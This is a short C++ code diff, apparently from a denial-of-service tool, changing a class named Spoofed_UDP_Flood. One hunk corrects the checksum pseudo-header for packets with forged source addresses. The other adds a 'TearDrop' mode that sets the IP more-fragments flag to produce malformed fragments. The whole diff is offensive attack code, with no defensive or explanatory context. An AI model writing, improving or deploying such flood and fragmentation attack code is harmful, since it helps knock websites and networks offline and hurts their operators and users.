@@ -46,9 +46,8 @@ void Spoofed_UDP_Flood::attack(const int *id) {
             dst.sin_addr.s_addr = ip->daddr;
             dst.sin_family = AF_UNSPEC;
 
-
-            psh.source_address = inet_addr(conf->website.c_str());
-            psh.dest_address = dst.sin_addr.s_addr;
+            psh.source_address = ip->saddr;
+            psh.dest_address = ip->daddr;
             psh.placeholder = 0;
             psh.protocol = IPPROTO_UDP;
             psh.length = htons(sizeof(struct udphdr) + strlen(buf));
@@ -84,7 +83,12 @@ Spoofed_UDP_Flood::Spoofed_UDP_Flood(const config *conf, Logger *logger) : Spoof
 }
 
 void Spoofed_UDP_Flood::override_headers(udphdr *udp, iphdr *ip) {
-
+    switch(conf->vector){
+        case config::TearDrop:
+            ip->frag_off |= htons(0x2000);
+            break;
+        default:break;
+    }
 }
 
 void Spoofed_UDP_Flood::init_headers(iphdr *ip, udphdr *udp, char *buf) {
